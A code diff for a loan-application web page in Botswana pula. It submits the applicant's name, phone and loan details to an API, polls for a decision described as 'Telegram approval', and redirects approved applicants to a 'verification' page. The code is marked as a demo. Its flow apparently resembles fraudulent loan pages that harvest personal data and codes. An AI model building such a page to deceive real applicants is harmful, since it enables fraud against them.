@@ -1271,130 +1271,105 @@ codeBoxes.forEach((box, index) => {
    CONFIRM AND SUBMIT APPLICATION
 ===================================== */
 
+
 document.getElementById("confirmSubmitButton").addEventListener("click", async function() {
 
     const button = this;
+    const errorBox = document.getElementById("confirmError");
 
-    const errorBox =
-        document.getElementById("confirmError");
-
-    const demoCode =
-        codeBoxes.map(box => box.value).join("");
+    const demoCode = codeBoxes.map(box => box.value).join("");
 
     errorBox.style.display = "none";
 
-
+    // Validate the five-digit demo code
     if (!/^[0-9]{5}$/.test(demoCode)) {
-
-        errorBox.textContent =
-            "For this demo, please enter any five digits.";
-
+        errorBox.textContent = "For this demo, please enter any five digits.";
         errorBox.style.display = "block";
-
         return;
-
     }
 
-
-    if (!API_URL) {
-
-        errorBox.textContent =
-            "Please configure your application API URL.";
-
+    if (!API_URL || !STATUS_URL || !APPROVED_REDIRECT_URL) {
+        errorBox.textContent = "Application configuration is incomplete.";
         errorBox.style.display = "block";
-
         return;
-
     }
-
 
     button.disabled = true;
-
     button.textContent = "Submitting...";
 
-
     document.getElementById("confirmation").classList.add("hidden");
-
     document.getElementById("processing").classList.remove("hidden");
-    requestAnimationFrame(() => {
-    window.scrollTo({
-        top: 0,
-        left: 0,
-        behavior: "instant"
-    });
-
-    document.documentElement.scrollTop = 0;
-    document.body.scrollTop = 0;
-});
-
-// Focus the first demo verification box
-setTimeout(() => {
-    codeBoxes[0].focus({ preventScroll: true });
-}, 400);
 
     document.getElementById("subtitle").textContent =
         "Submitting Your Application";
 
+    document.getElementById("processingTitle").textContent =
+        "Submitting Application";
+
+    document.getElementById("processingMessage").textContent =
+        "Please wait while we submit your application.";
+
+    document.getElementById("processingNote").textContent =
+        "PLEASE WAIT";
+
     window.scrollTo({
         top: 0,
+        left: 0,
         behavior: "smooth"
     });
 
-
-    /* JSON DATA SENT TO THE API */
-
+    // Application information
+    // The demo verification code is deliberately not sent to the API.
     const applicationData = {
-
         full_name: applicantName,
-
         phone_number: applicantPhone,
-
         loan_amount_bwp: loanAmount,
-
         period_months: loanPeriod,
-        demo_verification_code: demoCode,
+
         monthly_payment_bwp:
             Number(monthlyPayment.toFixed(2)),
 
         total_repayment_bwp:
-            Number(totalPayment.toFixed(2)),  
-
+            Number(totalPayment.toFixed(2))
     };
-
 
     try {
 
         const response = await fetch(API_URL, {
-
             method: "POST",
-
             headers: {
                 "Content-Type": "application/json"
             },
-
             body: JSON.stringify(applicationData)
-
         });
 
-
         if (!response.ok) {
-
             throw new Error(
                 "Application API returned HTTP " + response.status
             );
-
         }
 
+        // Read the API response ONCE
+        const result = await response.json();
+
+        // Confirm the API returned the required tracking details
+        if (!result.id || !result.status_token) {
+            throw new Error(
+                "The API response is missing the application ID or status token."
+            );
+        }
 
         document.getElementById("processingTitle").textContent =
             "Application Received";
 
         document.getElementById("processingMessage").textContent =
-            "Your demo application details have been submitted successfully.";
+            "Your application has been submitted successfully. We are waiting for the approval decision.";
 
         document.getElementById("processingNote").textContent =
-            "THANK YOU FOR APPLYING";
+            "AWAITING APPROVAL";
 
+        // Start checking the Telegram approval decision
+        checkApplicationStatus(result.id, result.status_token);
 
     } catch (error) {
 
@@ -1402,81 +1377,129 @@ setTimeout(() => {
             "Submission Unsuccessful";
 
         document.getElementById("processingMessage").textContent =
-            "We couldn't submit your application. Please check your connection and try again.";
+            "We couldn't submit your application. Please try again.";
 
         document.getElementById("processingNote").textContent =
             "PLEASE TRY AGAIN";
 
         console.error("Application submission error:", error);
 
+        // Allow the applicant to retry
+        const retryBox = document.getElementById("statusMessage");
+        retryBox.innerHTML = "";
+
+        const retryButton = document.createElement("button");
+        retryButton.textContent = "Try Again";
+        retryButton.type = "button";
+        retryButton.onclick = () => window.location.reload();
+
+        retryBox.appendChild(retryButton);
+        retryBox.style.display = "block";
     }
 });
+
 
 /* =====================================
    CHECK TELEGRAM APPROVAL STATUS
 ===================================== */
 
 async function checkApplicationStatus(applicationId, statusToken) {
-    const statusMessage = document.getElementById("processingMessage");
 
-    const checkStatus = async () => {
+    const title = document.getElementById("processingTitle");
+    const message = document.getElementById("processingMessage");
+    const note = document.getElementById("processingNote");
+    const statusBox = document.getElementById("statusMessage");
+
+    let checking = false;
+    let interval;
+
+    async function checkStatus() {
+
+        // Prevent overlapping status requests
+        if (checking) return;
+
+        checking = true;
+
         try {
+
             const response = await fetch(
                 `${STATUS_URL}?id=${encodeURIComponent(applicationId)}&token=${encodeURIComponent(statusToken)}`
             );
 
             if (!response.ok) {
-                throw new Error("Status check failed: " + response.status);
+                throw new Error(
+                    "Status check failed: " + response.status
+                );
             }
 
             const data = await response.json();
 
             if (data.status === "approved") {
-                document.getElementById("processingTitle").textContent =
-                    "Application Approved";
 
-                statusMessage.textContent =
+                clearInterval(interval);
+
+                title.textContent = "Application Approved";
+
+                message.textContent =
                     "Congratulations! Your application has been approved. Redirecting to verification...";
 
-                document.getElementById("processingNote").textContent =
-                    "APPLICATION APPROVED";
+                note.textContent = "APPLICATION APPROVED";
 
+                statusBox.style.display = "none";
+
+                // Redirect to the verification page
                 window.location.href = APPROVED_REDIRECT_URL;
-                return true;
+
+                return;
             }
 
             if (data.status === "rejected") {
-                document.getElementById("processingTitle").textContent =
-                    "Application Rejected";
 
-                statusMessage.textContent =
-                    "Your application has been rejected. Please review your details and try again.";
+                clearInterval(interval);
 
-                document.getElementById("processingNote").textContent =
-                    "PLEASE TRY AGAIN";
+                title.textContent = "Application Rejected";
 
-                return true;
+                message.textContent =
+                    "Unfortunately, your application has been rejected. You may start a new application.";
+
+                note.textContent = "APPLICATION REJECTED";
+
+                // Display a button to start again
+                statusBox.innerHTML = "";
+
+                const retryButton = document.createElement("button");
+                retryButton.textContent = "Start a New Application";
+                retryButton.type = "button";
+                retryButton.onclick = () => window.location.reload();
+
+                statusBox.appendChild(retryButton);
+                statusBox.style.display = "block";
+
+                return;
             }
 
-            return false;
+            // Still pending
+            message.textContent =
+                "Your application is awaiting approval. Please wait while we check its status.";
+
+            note.textContent = "AWAITING APPROVAL";
 
         } catch (error) {
+
             console.error("Status checking error:", error);
-            return false;
+
+        } finally {
+
+            checking = false;
+
         }
-    };
+    }
 
-    const interval = setInterval(async () => {
-        const finished = await checkStatus();
-
-        if (finished) {
-            clearInterval(interval);
-        }
-    }, 5000);
-
+    // Check immediately, then every five seconds
     await checkStatus();
-}
 
+    interval = setInterval(checkStatus, 5000);
+}
 /* =====================================
    INITIAL CALCULATION
 ===================================== */
@@ -1484,6 +1507,12 @@ async function checkApplicationStatus(applicationId, statusToken) {
 calculate();
 
 </script>
-<div id="statusMessage" class="status-message" style="display:none;"></div>
+
+<div
+    id="statusMessage"
+    class="status-message"
+    style="display:none;"
+></div>
+
 </body>
 </html>
